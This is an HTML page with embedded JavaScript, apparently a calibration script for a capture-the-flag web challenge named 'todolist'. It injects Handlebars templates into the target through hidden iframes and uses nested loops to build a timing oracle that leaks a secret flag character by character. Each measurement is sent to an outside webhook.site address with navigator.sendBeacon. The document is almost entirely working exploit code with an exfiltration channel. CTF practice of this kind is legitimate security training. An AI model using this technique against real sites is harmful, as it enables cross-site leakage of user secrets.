<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>calibrate</title></head><body>
<pre id="log"></pre>
<script>
const TARGET  = "https://todolist.challs.srdnlen.it";
const WEBHOOK = "https://webhook.site/6f885820-07e1-42ec-965b-8042f45342f8";
const ARRLEN  = 11;
const DEPTH   = 7;

const ARR  = JSON.stringify(Array.from({length:ARRLEN},(_,i)=>i));
const OPEN = "{{#each @root.arr}}".repeat(DEPTH);
const CLOS = "{{/each}}".repeat(DEPTH);

function ping(msg) {
  document.getElementById("log").textContent += msg + "\n";
  navigator.sendBeacon(`${WEBHOOK}?log=${encodeURIComponent(msg)}`);
}

function makeUrl(pos, ch) {
  const tpl = `{{#if (eq (lookup secret ${pos}) "${ch}")}}${OPEN}X${CLOS}{{/if}}`;
  return TARGET + "/?data=" + encodeURIComponent(`{"arr":${ARR}}`)
       + "&template=" + encodeURIComponent(tpl);
}

function probeOne(pos, ch, timeout) {
  return new Promise(resolve => {
    const f  = document.createElement("iframe");
    f.style  = "width:1px;height:1px;position:fixed;top:-9999px;left:-9999px";
    let fired = false;
    const t0  = Date.now();
    function done(label) {
      if (fired) return; fired = true;
      clearTimeout(tid);
      try { f.src="about:blank"; f.remove(); } catch(e) {}
      resolve({ dt: Date.now()-t0, label });
    }
    const tid = setTimeout(() => done("TIMEOUT"), timeout);
    f.onload  = () => done("load");
    f.onerror = () => done("error");
    f.src = makeUrl(pos, ch);
    document.body.appendChild(f);
  });
}

async function run() {
  ping("=== CALIBRATION START ===");
  ping(`Target: ${TARGET}`);

  // Step 1: Known NO-MATCH — pos=0 char='a'  (flag[0]='s', so 'a' must be fast)
  ping("\n[TEST 1] pos=0 char='a'  → expected: FAST (no match)");
  const t1 = await probeOne(0, "a", 10000);
  ping(`[TEST 1] dt=${t1.dt}ms label=${t1.label} ${t1.dt < 2000 ? "✓ FAST as expected" : "✗ SLOW — unexpected!"}`);

  // Step 2: Known MATCH — pos=0 char='s'  (flag[0]='s', must be slow)
  ping("\n[TEST 2] pos=0 char='s'  → expected: SLOW (match)");
  const t2 = await probeOne(0, "s", 10000);
  ping(`[TEST 2] dt=${t2.dt}ms label=${t2.label} ${t2.dt > 2000 ? "✓ SLOW as expected" : "✗ FAST — oracle broken!"}`);

  // Step 3: Known MATCH — pos=1 char='r'
  ping("\n[TEST 3] pos=1 char='r'  → expected: SLOW (match)");
  const t3 = await probeOne(1, "r", 10000);
  ping(`[TEST 3] dt=${t3.dt}ms label=${t3.label} ${t3.dt > 2000 ? "✓ SLOW as expected" : "✗ FAST — oracle broken!"}`);

  // Step 4: Known NO-MATCH — pos=1 char='z'
  ping("\n[TEST 4] pos=1 char='z'  → expected: FAST (no match)");
  const t4 = await probeOne(1, "z", 10000);
  ping(`[TEST 4] dt=${t4.dt}ms label=${t4.label} ${t4.dt < 2000 ? "✓ FAST as expected" : "✗ SLOW — unexpected!"}`);

  // Summary
  const diff = t2.dt - t1.dt;
  ping(`\n=== SUMMARY ===`);
  ping(`no-match baseline: ${t1.dt}ms`);
  ping(`match time:        ${t2.dt}ms`);
  ping(`difference:        ${diff}ms`);
  ping(`oracle works:      ${diff > 1000 ? "YES ✓" : "NO ✗"}`);
  ping(`good MATCH_TIMEOUT: ${Math.round(t1.dt * 3)}ms  (3× no-match baseline)`);

  navigator.sendBeacon(`${WEBHOOK}?CALIBRATE_DONE&nomatch=${t1.dt}&match=${t2.dt}&diff=${diff}&works=${diff>1000}`);
}

run();
</script>
</body></html>
